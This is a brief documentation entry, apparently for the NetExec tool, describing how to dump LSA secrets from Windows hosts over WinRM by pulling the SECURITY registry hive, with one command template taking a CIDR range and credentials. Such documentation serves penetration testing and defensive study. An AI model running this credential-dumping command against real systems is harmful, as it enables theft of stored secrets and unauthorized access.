title: Dump LSA
html:
Dump LSA

Dump LSA secrets

Extracts and downloads SECURITY registry hive, and uses secretsdump.py methods locally to dump secrets

nxc winrm <CIDR> -u <USERNAME> -p <PASSWORD> --lsa
